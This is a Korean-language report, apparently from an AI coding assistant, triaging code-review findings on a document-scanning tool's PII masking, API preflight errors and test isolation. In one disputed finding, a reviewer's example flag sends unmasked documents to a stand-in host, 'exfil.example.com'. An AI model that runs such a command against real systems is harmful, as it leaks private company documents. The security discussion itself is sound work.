  마침표까지 같이 막아버린 것이다.

  수정 방향. ". 자체를 막는다" → ". 다음에 영숫자가 오는 경우만 막는다"로
  바꿨다. 그러면 .kr(도메인 계속)은 계속 잡고, .(문장 끝)은 통과한다.

  A-2. 문장 끝 IP가 마스킹되지 않음

  같은 원인, 같은 증상.

  입력:  "서버 주소 192.168.0.1."
  이전:  "서버 주소 192.168.0.1."      ← 사내 IP가 그대로 외부로
  이후:  "서버 주소 [REDACTED_IP]."

  한 줄에 여러 개 있으면 앞의 것만 잡히고 뒤의 것이 새는 더 헷갈리는 형태로도
  나타났다:

  입력:  "ip 192.168.0.1, 10.0.0.2."
  이전:  "ip [REDACTED_IP], 10.0.0.2."   ← 두 번째만 유출
  이후:  "ip [REDACTED_IP], [REDACTED_IP]."

  ▎ 이 두 건이 왜 중요한가: 제품이 동의 화면에서 "PII 7종은 자동 마스킹"이라고 
  ▎ 사용자에게 약속한 기능이다. 사용자는 그 약속을 믿고 회사 문서를 해외 API로 
  ▎ 보내기로 결정한다. 약속이 지켜지지 않으면 단순 버그가 아니라 동의의 전제가 
  ▎ 무너지는 것이다.
  ▎
  ▎ 그리고 이건 내가 직전 보안 수정에서 새로 만든 버그다. 한글 
  ▎ 인접(010-1234-5678로)만 테스트하고 마침표 종결을 테스트하지 않아 놓쳤다.

  A-3. preflight가 모든 오류를 "API 키 문제"로 뭉갬

  무엇이 문제였나. 클라우드 스캔을 시작하기 전 GET /v1/models로 연결을 한 번
  확인하는데, 이 호출이 어떤 이유로든 실패하면 전부 "인증 실패"로 처리했다.

  상황: Anthropic 서버 일시 장애(503) 또는 와이파이가 1초 끊김

  이전:  "Anthropic API 프리플라이트에 실패했습니다 —
          ANTHROPIC_API_KEY 값과 네트워크 연결을 확인하세요."
         → 사용자가 멀쩡한 API 키를 재발급받고 앉아 있게 된다

  이후:  "Anthropic API에 연결하지 못했습니다 — 네트워크 연결과 서비스 상태를
          확인한 뒤 다시 실행하세요. (API 키 문제는 아닙니다.)"

  수정 방향. 401·403(자격증명 거부)만 CloudAuthError, 나머지(5xx·타임아웃·연결
  거부·DNS)는 새로 만든 CloudUnavailableError로 분리했다. 둘 다 exit 1은
  그대로라 종료 코드 체계는 안 바뀐다.

  A-4. 429(레이트리밋) 판정이 예외 내부 구조에 의존

  무엇이 문제였나. "이 실패가 레이트리밋인가?"를 판정하는 코드가 이렇게
  생겼었다:

  cause = exc.__cause__          # 관문이 감싼 원래 예외를 꺼내서
  return getattr(cause, "code", None) == 429   # 그 안의 code를 들여다봄

  __cause__는 관문(gateway)의 내부 구현 세부사항이다. 나중에 누가 관문에 재시도
  래퍼를 하나 넣거나 raise ... from None으로 바꾸면, 이 코드는 에러 없이 조용히 
  항상 False를 반환한다. 그러면 cloud_rate_limited 사유가 통째로 죽는데 테스트는
  전부 통과한다(테스트도 같은 방식으로 가짜 예외를 만들었기 때문).

  수정 방향. GatewayError.status를 관문의 공개 계약으로 올렸다. 이제 exc.status 
  == 429 한 줄이고, 관문이 예외를 어떻게 감싸든 상관없다.

  ---

  B. 타당함 — 아직 안 고쳤다 (7건)

  B-1. --engine cloud인데도 Ollama가 반드시 필요함 🔴 가장 큰 건

  증상.
  # Ollama를 설치한 적 없는 사용자
  corpbrain consent cloud --grant
  export ANTHROPIC_API_KEY=sk-ant-...
  corpbrain scan ./docs --engine cloud

  → exit 1: "Ollama 데몬이 응답하지 않습니다"

  클라우드를 쓰겠다고 명시했는데도 로컬 Ollama 데몬과 임베딩 모델이 없으면
  시작조차 못 한다.

  왜 문제인가. 스펙 §1이 v0.5의 대상 시나리오로 **"로컬 환경 미가용(GPU
  없음·Ollama 미설치 등)"**을 명시했다. 정작 그 사용자가 막힌다. GPU 게이트는 이
  목적으로 이미 면제해줬는데(§4.7), 그보다 앞단의 Ollama 데몬 검사는 그대로
  남아 있다.

  왜 안 고쳤나. 스펙 §2가 **"임베딩은 언제나 로컬"**을 비목표로 못박았기
  때문이다. scan은 위키 생성과 벡터 인덱싱을 항상 함께 하므로(v0.4의 파괴적
  변경), 임베딩을 하려면 Ollama가 필요하다. 즉 이건 코드 버그가 아니라 스펙 두 
  조항이 서로 충돌하는 것이다. 선택지는 셋:

  ┌────────────────────┬────────────────────┬──────────────────────────────┐
  │         안         │        내용        │             대가             │
  ├────────────────────┼────────────────────┼──────────────────────────────┤
  │ ① cloud일 때       │ 위키만 만들고      │ v0.4 계약("scan은 항상       │
  │ 인덱싱 생략        │ search 불가        │ 인덱싱") 파괴                │
  ├────────────────────┼────────────────────┼──────────────────────────────┤
  │ ② 임베딩도         │ Ollama 완전 불필요 │ §2 비목표 정면 위반, 범위    │
  │ 클라우드 허용      │                    │ 크게 증가                    │
  ├────────────────────┼────────────────────┼──────────────────────────────┤
  │ ③ 현행 유지 +      │ 코드 안 바꿈       │ §1의 목표 시나리오 하나를    │
  │ 문서화             │                    │ 포기                         │
  └────────────────────┴────────────────────┴──────────────────────────────┘

  이건 사용자 결정이 필요하다.

  B-2. PII 리포트가 원시 영문 토큰을 출력

  현재:  PII 마스킹 7건 (문서 3개) — ACCOUNT 2건, BIZ_NO 1건, RRN 4건
  기대:  PII 마스킹 7건 (문서 3개) — 계좌번호 2건, 사업자등록번호 1건,
  주민등록번호 4건

  PiiType.label에 한국어 이름(주민등록번호, 사업자등록번호…)이 이미 만들어져 
  있는데 호출부가 0곳이다. 방금 grep으로 확인했다 — pii.py 안에서만 정의되고
  아무도 안 쓴다. 스펙의 "출력 언어는 항상 한국어" 규칙 위반이자, 죽은 코드를
  유지비만 내고 있는 상태다. 고치는 게 맞고, 한 줄이면 된다.

  B-3. "파일별" PII 표시가 없음

  스펙 §4.5는 치환 건수를 "파일별로" 표시하라고 했는데, 실제로는 집계 한 줄만
  나온다.

  현재:  PII 마스킹 7건 (문서 3개) — ...
         → 40개 문서를 스캔했을 때 "어느 3개"인지 알 수 없다

  감사(audit) 관점에서 이 기능이 존재하는 이유가 바로 "어느 문서가 가려진 채
  나갔나"인데, 그 질문에 답을 못 한다. 데이터(pii_maskings[].path)는 이미 들고
  있고 build_detail_lines가 렌더만 안 하는 상태다.

  B-4. 시작 배너가 틀린 모델명을 찍음

  corpbrain scan ./docs --engine cloud --cloud-model claude-sonnet-4-5

  → 스캔 시작: ./docs → ./corpbrain_wiki (모델 qwen2.5:7b-instruct)
                                              ^^^^^^^^^^^^^^^^^^^^
                                              한 번도 호출되지 않는 모델

  같은 커밋에서 RunStarted/ModelReady 이벤트는 summarizer.model로 고쳤는데 이
  stderr 한 줄만 빠뜨렸다. 단순 누락이고 한 줄 수정이다.

  B-5. engine = "cloud" 문자열 하드코딩

  class OllamaSummarizer:
      engine = ENGINE_LOCAL      # 상수 사용 ✓

  class AnthropicSummarizer:
      engine = "cloud"           # 리터럴 ✗

  config.py의 ENGINE_CLOUD를 나중에 "anthropic" 같은 값으로 바꾸면, CLI는 새
  값을 받는데 front-matter에는 계속 "cloud"가 적힌다. 그러면 재실행
  판정(engine이 다르면 강제 재생성)이 매번 다르다고 판단해 전체를 재생성하거나
  그 반대가 된다. 지금 당장 깨지진 않지만 지뢰다.

  B-6. getattr로 프로토콜을 우회

  masked = getattr(summarizer, "last_mask", None)   # pipeline.py:430

  이 PR에서 Summarizer 프로토콜을 새로 만들어놓고, 정작 PII 결과는 프로토콜에
  없는 속성을 getattr로 더듬어 꺼낸다. last_mask를 last_masking으로 rename하면
  getattr이 None을 돌려주고 → PII 리포트가 통째로 사라지는데 → 타입 체크도 
  테스트도 통과한다. getattr + 기본값은 정의상 타입 검사를 빠져나가기 때문이다.

  B-7. doctor 테스트가 개발자의 실제 홈을 읽음

  consent.py는 테스트 격리를 위해 경로 주입 seam을 일부러 만들어뒀는데,
  diagnose()가 그걸 안 쓰고 is_cloud_consent_granted()를 인자 없이 부른다.
  tests/test_doctor.py에는 Path.home 패치가 없고 conftest.py도 없다 — 방금
  확인했다.

  지금 이 머신은 ~/.corpbrain도 없고 ANTHROPIC_API_KEY도 미설정이라 우연히
  테스트가 통과한다. 하지만 스펙이 요구하는 수동 스모크 테스트(consent cloud 
  --grant)를 한 번 실행하는 순간, 그 뒤로 doctor 테스트는 조용히 다른 분기를
  타게 된다.

  ---

  C. 동의하지 않거나 판단이 갈림 (4건)

  C-1. "로컬 경로에 NetworkGuard가 없다"

  리뷰 주장: corpbrain scan --ollama-url http://exfil.example.com:11434로 오타를
  내면 마스킹 안 된 문서 전문이 임의 호스트로 나간다.

  내 판단: 취약점은 아니다. --ollama-url은 CLI 플래그이고, 보안 검토 기준에서
  CLI 플래그와 환경변수는 신뢰 입력이다(공격자가 제어할 수 있으면 이미 그 사람은
  파일을 직접 읽을 수 있다).

  그리고 스펙 §4.4의 문구 "local은 --ollama-url의 호스트만 허용"은 자기참조라 
  실질적으로 no-op이다 — 내가 부르려는 URL의 호스트를 허용하는 건 아무것도 막지
  않는다. 리뷰가 실제로 원하는 건 "localhost로만 제한하라"인데 그건 스펙에 없는
  다른 요구다. 리버스 프록시 뒤에 Ollama를 두는 사용자를 막게 되므로 스펙 결정이
  필요하다.

  C-2. cloud 전용 타임아웃 상수

  스펙 §4.3이 "cloud 전용 신규 타임아웃 상수는 두지 않는다"고 했는데
  DEFAULT_TIMEOUT = 300.0을 새로 만들었다는 지적.

  이미 알고 기록해둔 건이다. 스펙은 "기존 DEFAULT_TIMEOUT(60초, 세 모듈이
  공유)를 재사용"이라 적었는데, 그런 60초 공유 상수가 코드베이스에 실재하지 
  않는다 — 실제로는 summarize=300초, embed=60초로 제각각이다. 스펙의 사실 서술이
  틀린 것이라, 같은 성격(요약)의 값을 따랐고 이 판단을 체크포인트에 MINOR로
  기록해뒀다.

  C-3. ISO 날짜가 계좌번호로 과탐

  "회의 2026-08-21 진행" → "회의 [REDACTED_ACCOUNT] 진행"

  스펙이 명시적으로 승인한 동작이다. §4.5가 계좌번호를 "은행별 표준 포맷이 없어
  휴리스틱이며 7종 중 오탐률이 가장 높다"고 인지하고 채택했고, 기존 테스트가 이
  동작을 test_iso_date_is_over_masked_as_account로 못박아 뒀다.

  다만 리뷰의 부수 지적은 타당하다 — 계약서·회의록은 거의 모든 줄에 날짜가 
  있어서 요약이 "[REDACTED_ACCOUNT]에 시작해 [REDACTED_ACCOUNT]에 종료"처럼
  되고, PII 건수 집계도 노이즈로 부풀어 오른다. (?!\d{4}-\d{2}-\d{2}) 한 줄로
  날짜만 제외할 수 있다.

  C-4. consent가 권한 오류를 삼키고 덮어씀

  파일이 일시적으로 읽기 불가(동기화 클라이언트 잠금 등)일 때 {}로 읽고 전체를
  덮어써서 다른 키가 날아간다는 지적.

  논리는 맞지만 현재 실질 피해가 없다. 지금 이 설정 파일에 다른 키를 쓰는 기능
  자체가 없기 때문이다. 다만 "후속 설정 확장을 위한 이음새"로 만들어둔 구조라,
  그 이음새를 실제로 쓰기 시작하면 진짜 문제가 된다.

  ---

  정리

  리뷰의 가장 큰 가치는 A-1·A-2였다. 내가 보안 검토 지적을 고치면서 새로 만든 
  유출을 잡아냈다. 보안 수정이 또 다른 보안 구멍을 내는 건 흔한 패턴인데,
  리뷰어가 정규식을 실제로 실행해 확인했기 때문에 잡혔다.

  다음에 고칠 만한 것을 우선순위로 꼽으면:

  1. B-2 (한국어 라벨) — 한 줄, 스펙 위반, 죽은 코드 제거
  2. B-4 (배너 모델명) — 한 줄, 명백한 누락
  3. B-3 (파일별 PII 표시) — 감사 기능의 핵심 목적
  4. B-5·B-6 (하드코딩·getattr) — 지금은 안 깨지지만 조용히 깨질 구조
  5. B-1 (cloud의 Ollama 의존) — 스펙 결정 필요, 가장 큼

  어느 것부터 진행할까? 1·2·4는 지금 바로 묶어서 처리할 수 있다.

✻ Baked for 2m 22s